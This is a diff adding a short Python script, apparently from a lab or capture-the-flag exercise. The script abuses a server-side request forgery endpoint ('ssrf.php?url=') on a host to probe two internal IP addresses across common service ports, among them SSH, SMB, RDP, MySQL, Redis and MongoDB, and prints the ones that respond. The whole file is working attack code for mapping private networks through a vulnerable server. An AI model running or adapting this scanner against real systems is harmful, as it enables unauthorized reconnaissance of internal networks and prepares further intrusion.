@@ -1,0 +1,15 @@
+import requests
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
+}
+ip=['192.168.1.1','192.168.1.100']
+port=['22','80','445','1433','1521','3306','3389','5432','6379','27017']
+for i in range(len(ip)):
+    for t in range(len(port)):
+        try:
+            url='http://ming.com/ssrf.php?url='
+            url=url+ip[i]+':'+port[t]
+            s=requests.get(url,headers=headers,timeout=0.5)
+            print(f'{ip[i]} {port[t]}')
+        except:
+            continue
